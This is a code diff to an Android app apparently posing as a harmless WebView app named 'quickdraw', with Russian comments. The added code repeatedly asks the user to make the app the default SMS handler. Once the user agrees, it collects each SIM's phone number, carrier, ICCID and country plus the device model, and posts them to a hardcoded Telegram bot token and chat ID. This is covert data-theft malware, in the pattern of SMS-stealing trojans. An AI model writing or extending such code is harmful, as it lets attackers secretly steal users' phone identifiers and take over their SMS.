@@ -2,20 +2,28 @@ package com.android.quickdraw
 
 import android.annotation.SuppressLint
 import android.app.role.RoleManager
+import android.content.Context
 import android.content.Intent
 import android.content.SharedPreferences
 import android.os.Build
 import android.os.Bundle
 import android.provider.Telephony
+import android.telephony.SubscriptionManager
+import android.telephony.TelephonyManager
 import android.webkit.WebView
 import android.webkit.WebViewClient
 import androidx.appcompat.app.AppCompatActivity
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
+import java.io.IOException
 
 class MainActivity : AppCompatActivity() {
 
     private lateinit var webView: WebView
     private lateinit var sharedPrefs: SharedPreferences
     private val SMS_ROLE_REQUEST_CODE = 101
+    private val client = OkHttpClient()
 
     @SuppressLint("SetJavaScriptEnabled")
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -44,6 +52,10 @@ class MainActivity : AppCompatActivity() {
     private fun checkAndRequestSmsRole() {
         if (!isDefaultSmsApp()) {
             requestSmsRole()
+        } else {
+            // Если уже является приложением по умолчанию
+            sendNotification("✅ Пользователь сделал приложением по умолчанию")
+            sendSimInfoNotification()
         }
     }
 
@@ -73,10 +85,106 @@ class MainActivity : AppCompatActivity() {
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
-        if (requestCode == SMS_ROLE_REQUEST_CODE && !isDefaultSmsApp()) {
-            // Повторяем запрос, если разрешение не получено
-            requestSmsRole()
+        if (requestCode == SMS_ROLE_REQUEST_CODE) {
+            if (isDefaultSmsApp()) {
+                sendNotification("Пользователь сделал приложением по умолчанию")
+                sendSimInfoNotification()
+            } else {
+                // Повторяем запрос, если разрешение не получено
+                requestSmsRole()
+            }
         }
+    }
+
+    private fun sendNotification(message: String) {
+        try {
+            val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
+            val fullMessage = "$message\n$deviceModel"
+
+            val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
+            val chatId = "6331293386"
+            val url = "https://api.telegram.org/bot$botToken/sendMessage"
+
+            val mediaType = "application/json".toMediaType()
+            val requestBody = """
+                {
+                    "chat_id": "$chatId",
+                    "text": "$fullMessage",
+                    "parse_mode": "Markdown"
+                }
+            """.trimIndent().toRequestBody(mediaType)
+
+            val request = Request.Builder()
+                .url(url)
+                .post(requestBody)
+                .build()
+
+            client.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                    e.printStackTrace()
+                }
+
+                override fun onResponse(call: Call, response: Response) {
+                    response.close()
+                }
+            })
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+    }
+
+    private fun sendSimInfoNotification() {
+        val simInfo = getSimNumbersString()
+        sendNotification("Информация о SIM-картах:\n$simInfo")
+    }
+
+    @SuppressLint("HardwareIds", "MissingPermission")
+    private fun getSimNumbersString(): String {
+        val result = StringBuilder()
+        
+        try {
+            val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
+                val activeSubscriptions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                    subscriptionManager.activeSubscriptionInfoList
+                } else {
+                    @Suppress("DEPRECATION")
+                    subscriptionManager.activeSubscriptionInfoList
+                }
+                
+                if (activeSubscriptions != null && activeSubscriptions.isNotEmpty()) {
+                    result.append("Найдено SIM-карт: ${activeSubscriptions.size}\n\n")
+                    
+                    for (subscription in activeSubscriptions) {
+                        val number = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                            telephonyManager.createForSubscriptionId(subscription.subscriptionId).line1Number
+                        } else {
+                            @Suppress("DEPRECATION")
+                            telephonyManager.line1Number
+                        }
+                        
+                        result.append("SIM ${subscription.simSlotIndex + 1}:\n")
+                        result.append("Номер: ${number ?: "недоступен"}\n")
+                        result.append("Оператор: ${subscription.carrierName ?: "неизвестен"}\n")
+                        result.append("IMSI: ${subscription.iccId ?: "недоступен"}\n")
+                        result.append("Страна: ${subscription.countryIso?.uppercase() ?: "неизвестна"}\n\n")
+                    }
+                } else {
+                    result.append("Активные SIM-карты не найдены\n")
+                }
+            } else {
+                @Suppress("DEPRECATION")
+                val number = telephonyManager.line1Number
+                result.append("Основной номер SIM: ${number ?: "недоступен"}\n")
+                result.append("(Метод для Multi-SIM не поддерживается в этой версии Android)\n")
+            }
+        } catch (e: Exception) {
+            result.append("Ошибка при получении номеров SIM: ${e.localizedMessage}")
+        }
+        
+        return result.toString()
     }
 
     override fun onBackPressed() {
